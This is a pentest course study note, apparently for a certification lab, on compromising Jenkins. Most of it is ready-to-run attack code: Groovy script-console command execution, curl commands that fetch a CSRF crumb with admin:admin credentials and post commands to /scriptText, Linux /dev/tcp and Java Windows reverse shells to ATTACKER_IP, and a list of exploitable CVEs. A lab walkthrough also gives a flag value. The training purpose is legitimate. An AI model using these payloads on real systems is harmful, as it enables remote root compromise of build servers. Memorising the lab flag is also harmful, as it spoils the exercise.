# Section 12 — Attacking Jenkins

Two main attack paths:

```
1. Script Console (authenticated) → Groovy RCE → OS command execution
2. Known CVEs (unauthenticated on older versions)
```

---

## 1 — Script Console RCE (Primary Method)

Requires admin access. Navigate to `/script` or POST to `/scriptText`.

Jenkins uses **Groovy** — full JVM access, can exec OS commands directly.

### Read a file (quickest — no shell needed)
```groovy
def cmd = 'cat /path/to/file'
def proc = cmd.execute()
proc.waitFor()
println proc.text
```

### Via curl (no browser needed)
```bash
# Get CSRF crumb first
CRUMB=$(curl -s -c /tmp/j.txt -u "admin:admin" \
  "http://TARGET:8000/crumbIssuer/api/json" \
  | grep -oP '"crumb":"\K[^"]+')

# Execute command — /scriptText returns raw output, no HTML parsing needed
curl -s -b /tmp/j.txt -u "admin:admin" \
  -X POST \
  --data-urlencode "script=def cmd = 'id'; def proc = cmd.execute(); proc.waitFor(); println proc.text" \
  -H "Jenkins-Crumb: $CRUMB" \
  "http://TARGET:8000/scriptText"
# uid=0(root) gid=0(root) groups=0(root)
```

**Key:** Use `/scriptText` endpoint (not `/script`) — returns raw text, no HTML parsing.

### Linux reverse shell via script console
```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKER_IP/4443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
```bash
nc -lvnp 4443
```

### Windows command execution
```groovy
def cmd = "cmd.exe /c whoami".execute()
println("${cmd.text}")
```

### Windows reverse shell (Java)
```groovy
String host="ATTACKER_IP";
int port=4443;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();
```

---

## 2 — Known CVEs

| CVE | Version | Description |
|-----|---------|-------------|
| CVE-2018-1999002 + CVE-2019-1003000 | ≤ 2.137 | Pre-auth RCE — bypass script sandbox via dynamic routing + malicious JAR |
| Jenkins 2.150.2 vuln | 2.150.2 | Auth RCE via Node.js job if anonymous users enabled |

Both are fixed in 2.303.1+. Check version first (`X-Jenkins` header) before trying these.

---

## Exam Notes

- Jenkins almost always runs as **root** (Linux) or **SYSTEM** (Windows) — instant full compromise
- Script console at `/script` (browser) or POST to `/scriptText` (curl)
- CSRF crumb required for POST requests: `/crumbIssuer/api/json`
- Groovy has full JVM access — can exec processes, read files, open sockets
- `cmd.execute()` works for simple commands; use `["/bin/bash", "-c", "..."] as String[]` for pipes/redirects
- On Windows: `cmd.execute()` doesn't work for shell built-ins — use `["cmd.exe", "/c", "..."] as String[]`
- MSF module: `exploit/multi/http/jenkins_script_console`

---

## Lab Walkthrough (`jenkins.inlanefreight.local:8000`)

Credentials: `admin:admin`

```bash
CRUMB=$(curl -s -c /tmp/j.txt -u "admin:admin" \
  "http://jenkins.inlanefreight.local:8000/crumbIssuer/api/json" \
  | grep -oP '"crumb":"\K[^"]+')

curl -s -b /tmp/j.txt -u "admin:admin" \
  -X POST \
  --data-urlencode "script=def cmd = 'cat /var/lib/jenkins3/flag.txt'; def proc = cmd.execute(); proc.waitFor(); println proc.text" \
  -H "Jenkins-Crumb: $CRUMB" \
  "http://jenkins.inlanefreight.local:8000/scriptText"
```

**Flag:** `f33ling_gr00000vy!`  
**Flag location:** `/var/lib/jenkins3/flag.txt`  
**Running as:** `root`
